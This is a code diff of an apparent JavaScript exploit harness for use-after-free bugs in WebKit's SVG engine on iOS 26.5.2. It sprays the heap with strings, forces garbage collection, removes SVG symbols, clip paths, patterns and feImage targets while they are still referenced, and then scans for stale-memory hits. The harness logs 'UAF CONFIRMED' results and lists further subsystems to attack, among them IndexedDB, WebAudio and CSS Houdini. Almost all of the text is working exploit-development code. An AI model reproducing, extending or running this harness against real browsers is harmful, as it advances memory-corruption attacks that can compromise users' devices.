+            containers.push({svg:svgP,sym:patP,el:rP,type:'pattern'});
+            patP=null;
+        }
+        await sleep(100); // let animations start + first paint
+        log('[*] all resource elements live, removing targets now','dim');
+        // remove all resource targets simultaneously
+        for(const c of containers){
+            if(c.sym&&c.sym.remove){try{c.sym.remove();}catch(_){}}
+            c.sym=null;
         }
         const post=sprayStrs(1024);
         await gcP(40);
-        log(`[*] symbols GC'd: ${gcCount}/20`,(gcCount>0?'ok':'inf'));
-        // Force getBBox on all use elements across all svgs
-        let exc=null,excCount=0;
-        for(const svg of svgs){
-            svg.querySelectorAll('use').forEach(u=>{
-                const s=sprayStrs(16);
-                try{void u.getBBox();}catch(e){exc=e;excCount++;}
-                try{void u.getBoundingClientRect();}catch(e){exc=e;excCount++;}
-                s.length=0;
-            });
+        log(`[*] GC complete — collected: ${gcCount}`,(gcCount>0?'ok':'inf'));
+        // force all elements to re-evaluate their freed resource refs
+        let excCount=0;
+        for(const c of containers){
+            const s=sprayStrs(8);
+            try{
+                if(c.type==='animate'){void c.el.getBBox();}
+                else{void c.el.getBoundingClientRect();}
+                c.el.style.opacity='0.999';void c.el.offsetWidth;c.el.style.opacity='';
+            }catch(e){excCount++;}
+            s.length=0;
         }
         post.length=0;
         const post2=sprayStrs(1024);
-        log(`[*] exceptions: ${excCount} gcCount: ${gcCount}`,(excCount>0?'ok':'bad'));
+        log(`[*] exceptions during resource re-eval: ${excCount}`,(excCount>0?'ok':'bad'));
         const h1=scanStrs(mega.filter(s=>s),'crash_mega');
-        const h2=scanStrs(post2,'crash_post');
-        log(`[*] str hits: mega=${h1} post=${h2}`,h1+h2>0?'ok':'bad');
-        if(h1+h2>0||excCount>0)log('[+] SVG USE UAF CONFIRMED on 26.5.2','ok');
+        const h2=scanStrs(post2,'crash_post2');
+        log(`[*] string spray hits: mega=${h1} post=${h2}`,h1+h2>0?'ok':'bad');
+        if(h1+h2>0||excCount>0)log('[+] SVG RESOURCE UAF CONFIRMED ✓','ok');
         else{
-            log('[-] survived — notes:','bad');
-            log(`  gcCount=${gcCount}: ${gcCount===0?'symbol kept alive by render tree (strong ref)':'symbol GC\'d but UAF patched or render tree cleaned up'}`,'inf');
-            log('  WebKit may hold strong RenderSVGResource ref keeping symbol alive','inf');
-            log('  Next: try SVGAnimateElement + href mutation during animation','inf');
-            log('  Or: SVGFilter + feImage href to removed element','inf');
+            log('[-] all paths survived','bad');
+            log(`  gcCount=${gcCount}: ${gcCount===0?'resources held alive by render tree (strong ref)':'freed but WebKit invalidated refs correctly before free'}`, 'inf');
+            log('[*] remaining vectors to try:','inf');
+            log('  - SVGGradientElement linearGradient href removed mid-render','inf');
+            log('  - SVGMaskElement mask="" attribute removed','inf');
+            log('  - SVGMarkerElement marker-start="" removed during paint','inf');
+            log('  - Web Animations API animating SVG href (different than SMIL)','inf');
+            log('  - IndexedDB cursor during GC (separate subsystem, strong UAF history)','inf');
         }
-        svgs.forEach(s=>s.remove());
+        containers.forEach(c=>{try{c.svg.remove();}catch(_){}});
         await yield_();
-    }
+    }else{log('[-] FinalizationRegistry unavailable','bad');}
     dis(false);
 }
 
 // ── RUN ALL ───────────────────────────────────────────────────────────
 async function runAll(){
     dis(true);clearLog();sep();
-    log('▶ SVG <use> clone UAF v1 — iOS 26.5.2','inf');sep();
-    log('[*] pivot from rdar://179729192 (patched) to SVG clone resource UAF','inf');
-    log('[*] same GC + spray methodology, new attack surface','inf');log('');
+    log('▶ SVG animate UAF v2 — iOS 26.5.2','inf');sep();
+    log('[*] target: animation value cache + CSS resource paths','inf');
+    log('[*] svg_v1 confirmed gcCount=3/5 (symbols DO get freed)','inf');
+    log('[*] now testing whether animation/CSS engines share same invalidation','inf');log('');
     await runDIAG(true);log('');
     const R={};
-    for(const [lbl,fn] of [['S1_basic_GC',runS1],['S2_repaint_rAF',runS2],
-                            ['S3_nested_use',runS3],['S4_mass_clone',runS4]]){
+    for(const [lbl,fn] of [
+        ['A1_animate_href',runA1],
+        ['A2_beginElement_timing',runA2],
+        ['A3_clippath_UAF',runA3],
+        ['A4_feImage_UAF',runA4],
+        ['A5_pattern_UAF',runA5]
+    ]){
         sep();log(`▶ ${lbl}`,'inf');sep();
         try{R[lbl]=await fn(true);}catch(e){log(`[!] ${lbl}: ${e}`,'bad');R[lbl]=null;}
         log('');
     }
-    sep();log('▶ SUMMARY v1','inf');sep();
+    sep();log('▶ SUMMARY v2','inf');sep();
     let anyHit=false;
-    for(const [lbl,r] of Object.entries(R)){
+    for(const[lbl,r] of Object.entries(R)){
         const hit=r===true;
         log(`  ${hit?'[+]':'[-]'} ${lbl}`,hit?'ok':'bad');
         if(hit)anyHit=true;
     }
     log('');
-    if(anyHit){log('[+] SVG USE UAF CONFIRMED on 26.5.2 ✓','ok');}
+    if(anyHit){log('[+] SVG RESOURCE UAF CONFIRMED on 26.5.2 ✓','ok');}
     else{
-        log('[-] no hit — key diagnostic: check DIAG gcCount','bad');
-        log('  gcCount=0 → render tree holds strong ref to symbol → no stale ptr possible','inf');
-        log('  gcCount>0 → symbol freed but WebKit cleaned up use clone correctly','inf');
-        log('[*] next vectors if miss:','inf');
-        log('  - SVGAnimateElement animating href → triggers resource re-resolution mid-animation','inf');
-        log('  - SVGFilterElement feImage href to removed element','inf');
-        log('  - SVGPatternElement referenced by fill, then pattern removed','inf');
-        log('  - CSS clip-path: url(#clipId) where clipId element is removed','inf');
+        log('[-] all paths survived — WebKit resource invalidation is thorough on 26.5.2','bad');
+        log('[*] conclusion: SVG resource tracking fully hardened in this build','inf');
+        log('[*] next pivot options:','inf');
+        log('  A: Web Animations API (not SMIL) animating SVG attributes','inf');
+        log('  B: SVGGradient / SVGMask / SVGMarker resource paths','inf');
+        log('  C: IndexedDB cursor UAF (completely different subsystem)','inf');
+        log('  D: WebAudio AudioNode graph GC during processing','inf');
+        log('  E: CSS Houdini Paint Worklet with removed element ref','inf');
     }
     sep();dis(false);
 }
